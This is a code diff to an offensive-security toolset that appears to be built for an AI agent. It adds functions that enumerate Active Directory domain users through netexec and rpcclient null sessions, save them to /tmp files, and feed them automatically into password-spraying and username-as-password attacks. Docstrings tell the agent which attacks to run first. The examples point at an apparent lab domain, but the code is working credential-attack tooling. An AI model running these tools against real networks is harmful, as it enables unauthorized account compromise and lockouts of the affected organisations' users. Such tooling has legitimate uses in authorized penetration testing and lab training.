@@ -285,6 +285,85 @@ class NetworkEnumerationTools(Toolset):
             logger.error(f"Share enumeration failed: {e}")
             return f"Share enumeration failed for {target}: {e}"
 
+    @dn.tool_method
+    def save_users_to_file(
+        self, target: str, username: str = "", password: str = "", domain: str = ""
+    ) -> str:
+        """
+        Enumerate users and save them to a file for password attacks.
+
+        This tool enumerates domain users and saves them to /tmp/users.txt,
+        which can then be used with username_as_password or password_spray.
+
+        **RUN THIS FIRST** before any password-based attacks.
+
+        Args:
+            target: Domain controller IP address
+            username: Username for authentication (use empty string for null session)
+            password: Password for authentication (use empty string for null session)
+            domain: Domain for authentication (optional)
+
+        Returns:
+            Path to the users file and count of users saved
+
+        Example:
+            >>> save_users_to_file("192.168.56.10", "", "", "")  # null session
+            >>> save_users_to_file("192.168.56.10", "user", "pass", "DOMAIN")
+        """
+        try:
+            # First enumerate users
+            cmd = ["netexec", "smb", target]
+
+            if username and password:
+                cmd.extend(["-u", username, "-p", password])
+                if domain:
+                    cmd.extend(["-d", domain])
+            else:
+                cmd.extend(["-u", "", "-p", ""])
+
+            cmd.append("--users")
+
+            stdout, _stderr, _ = _run_tool(cmd, timeout_seconds=120)
+            output = stdout or ""
+
+            # Try rpcclient fallback for null session
+            if not (username and password):
+                rpc_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
+                rpc_stdout, _rpc_stderr, _ = _run_tool(rpc_cmd, timeout_seconds=120)
+                if rpc_stdout:
+                    output += "\n" + rpc_stdout
+
+            # Parse usernames from output
+            users: set[str] = set()
+
+            # Pattern for netexec: DOMAIN\username or domain\username
+            for match in re.finditer(r"[A-Za-z0-9._-]+\\([A-Za-z0-9._-]+)", output):
+                user = match.group(1)
+                # Filter out machine accounts and common noise
+                if not user.endswith("$") and user.lower() not in ("", "anonymous"):
+                    users.add(user)
+
+            # Pattern for rpcclient: user:[username] rid:[0x...]
+            for match in re.finditer(r"user:\[([^\]]+)\]", output):
+                user = match.group(1)
+                if not user.endswith("$"):
+                    users.add(user)
+
+            if not users:
+                return f"[!] No users found to save. Raw output:\n{output[:500]}"
+
+            # Save to file
+            users_file = "/tmp/users.txt"  # nosec B108  # noqa: S108
+            with open(users_file, "w") as f:
+                f.write("\n".join(sorted(users)))
+
+            logger.info(f"[+] Saved {len(users)} users to {users_file}")
+            return f"[+] Saved {len(users)} users to {users_file}\nUsers: {', '.join(sorted(users)[:20])}{'...' if len(users) > 20 else ''}"
+
+        except Exception as e:
+            logger.error(f"Save users to file failed: {e}")
+            return f"Save users to file failed: {e}"
+
 
 class CredentialDiscoveryTools(Toolset):
     """Tools for discovering credentials through low-hanging fruit attacks.
@@ -488,8 +567,8 @@ class CredentialDiscoveryTools(Toolset):
         self,
         target: str,
         domain: str,
-        users_file: str,
         password: str,
+        users_file: str = "",
         delay_seconds: int = 0,
     ) -> str:
         """
@@ -500,36 +579,48 @@ class CredentialDiscoveryTools(Toolset):
 
         **CRITICAL**: Check lockout policy first. Default is usually 5 attempts.
 
+        If no users_file is provided, this tool will automatically enumerate users
+        from the target first using null session authentication.
+
         Args:
             target: Domain controller IP address
             domain: Target domain
-            users_file: Path to file containing usernames (one per line)
             password: Password to spray
+            users_file: Path to file containing usernames (optional - will auto-enumerate if not provided)
             delay_seconds: Delay between attempts (default: 0)
 
         Returns:
             Successful authentications (look for valid credentials)
 
         Example:
-            >>> password_spray("192.168.56.10", "north.sevenkingdoms.local", "/tmp/users.txt", "Password1")
+            >>> password_spray("192.168.56.10", "north.sevenkingdoms.local", "Password1")  # auto-enumerate
+            >>> password_spray("192.168.56.10", "north.sevenkingdoms.local", "Password1", "/tmp/users.txt")
         """
-        cmd = [
-            "netexec",
-            "smb",
-            target,
-            "-u",
-            users_file,
-            "-p",
-            password,
-            "-d",
-            domain,
-            "--continue-on-success",
-        ]
-
-        if delay_seconds > 0:
-            cmd.extend(["--jitter", str(delay_seconds)])
-
         try:
+            # Auto-enumerate users if no file provided
+            if not users_file:
+                logger.info(f"[*] No users file provided, auto-enumerating from {target}")
+                enumerated_file = self._enumerate_users_to_file(target)
+                if not enumerated_file:
+                    return "[!] Failed to enumerate users and no users_file provided. Try save_users_to_file first."
+                users_file = enumerated_file
+
+            cmd = [
+                "netexec",
+                "smb",
+                target,
+                "-u",
+                users_file,
+                "-p",
+                password,
+                "-d",
+                domain,
+                "--continue-on-success",
+            ]
+
+            if delay_seconds > 0:
+                cmd.extend(["--jitter", str(delay_seconds)])
+
             logger.info(f"[*] Password spraying {domain} with password: {password}")
             stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=300)
 
@@ -575,12 +666,73 @@ class CredentialDiscoveryTools(Toolset):
         except Exception as e:
             return f"Password spray failed: {e}"
 
+    def _enumerate_users_to_file(self, target: str) -> str | None:
+        """Enumerate users from target and save to temp file. Returns file path or None.
+
+        Uses credentials from state if available, otherwise tries null session.
+        """
+        try:
+            output = ""
+
+            # Check if we have credentials in state to use for authenticated enumeration
+            username, password, domain = "", "", ""
+            if self.state and self.state.credentials:
+                cred = self.state.credentials[0]  # Use first available credential
+                username, password, domain = cred.username, cred.password, cred.domain
+                logger.info(f"[*] Using credential {domain}\\{username} for user enumeration")
+
+            # Try netexec with credentials or null session
+            cmd = ["netexec", "smb", target]
+            if username and password:
+                cmd.extend(["-u", username, "-p", password])
+                if domain:
+                    cmd.extend(["-d", domain])
+            else:
+                cmd.extend(["-u", "", "-p", ""])
+            cmd.append("--users")
+
+            stdout, _stderr, _ = _run_tool(cmd, timeout_seconds=120)
+            output = stdout or ""
+
+            # Try rpcclient fallback for null session only
+            if not (username and password):
+                rpc_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
+                rpc_stdout, _, _ = _run_tool(rpc_cmd, timeout_seconds=120)
+                if rpc_stdout and "NT_STATUS" not in rpc_stdout:
+                    output += "\n" + rpc_stdout
+
+            # Parse usernames
+            users: set[str] = set()
+            for match in re.finditer(r"[A-Za-z0-9._-]+\\([A-Za-z0-9._-]+)", output):
+                user = match.group(1)
+                if not user.endswith("$") and user.lower() not in ("", "anonymous"):
+                    users.add(user)
+            for match in re.finditer(r"user:\[([^\]]+)\]", output):
+                user = match.group(1)
+                if not user.endswith("$"):
+                    users.add(user)
+
+            if not users:
+                logger.warning(f"[!] No users enumerated from {target}")
+                return None
+
+            # Save to temp file
+            users_file = "/tmp/users_auto.txt"  # nosec B108  # noqa: S108
+            with open(users_file, "w") as f:
+                f.write("\n".join(sorted(users)))
+            logger.info(f"[+] Auto-enumerated {len(users)} users to {users_file}")
+            return users_file
+
+        except Exception as e:
+            logger.error(f"Auto user enumeration failed: {e}")
+            return None
+
     @dn.tool_method
     def username_as_password(
         self,
         target: str,
         domain: str,
-        users_file: str,
+        users_file: str = "",
     ) -> str:
         """
         Test if any user has their username as their password (LOW HANGING FRUIT).
@@ -590,33 +742,45 @@ class CredentialDiscoveryTools(Toolset):
 
         **RUN THIS EARLY** - Zero lockout risk, high success rate in weak environments.
 
+        If no users_file is provided, this tool will automatically enumerate users
+        from the target first using null session authentication.
+
         Args:
             target: Domain controller IP address
             domain: Target domain
-            users_file: Path to file containing usernames (one per line)
+            users_file: Path to file containing usernames (optional - will auto-enumerate if not provided)
 
         Returns:
             Users with username=password combinations
 
         Example:
+            >>> username_as_password("192.168.56.10", "north.sevenkingdoms.local")  # auto-enumerate
             >>> username_as_password("192.168.56.10", "north.sevenkingdoms.local", "/tmp/users.txt")
         """
-        # netexec's --no-bruteforce flag tests user1:user1, user2:user2, etc.
-        cmd = [
-            "netexec",
-            "smb",
-            target,
-            "-u",
-            users_file,
-            "-p",
-            users_file,
-            "-d",
-            domain,
-            "--no-bruteforce",
-            "--continue-on-success",
-        ]
-
         try:
+            # Auto-enumerate users if no file provided
+            if not users_file:
+                logger.info(f"[*] No users file provided, auto-enumerating from {target}")
+                enumerated_file = self._enumerate_users_to_file(target)
+                if not enumerated_file:
+                    return "[!] Failed to enumerate users and no users_file provided. Try save_users_to_file first."
+                users_file = enumerated_file
+
+            # netexec's --no-bruteforce flag tests user1:user1, user2:user2, etc.
+            cmd = [
+                "netexec",
+                "smb",
+                target,
+                "-u",
+                users_file,
+                "-p",
+                users_file,
+                "-d",
+                domain,
+                "--no-bruteforce",
+                "--continue-on-success",
+            ]
+
             logger.info(f"[*] Testing username=password combinations in {domain}")
             stdout, stderr, _returncode = _run_tool(cmd, timeout_seconds=300)
 
